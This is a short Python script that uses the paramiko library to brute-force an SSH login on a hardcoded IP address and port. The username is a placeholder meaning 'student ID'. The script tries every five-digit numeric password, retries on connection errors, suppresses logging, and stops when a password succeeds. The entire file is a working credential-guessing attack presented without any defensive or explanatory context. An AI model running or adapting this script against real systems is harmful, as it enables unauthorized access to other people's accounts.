import paramiko
import time
import logging

logging.getLogger().setLevel(logging.CRITICAL)

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

def test(pwd):
    while True:
        try:
            ssh.connect("140.120.13.242", 1200, "學號", pwd)
            print("pwd is " + pwd)
            return True
        except Exception as error:
            if str(error) == "Authentication failed.":
                print("Failed {} ({})".format(pwd, error))
                return False
            else:
                time.sleep(1)
                print("Retry")

for x in range(10000, 99999):
    pwd = str(x)
    if test(pwd):
        break
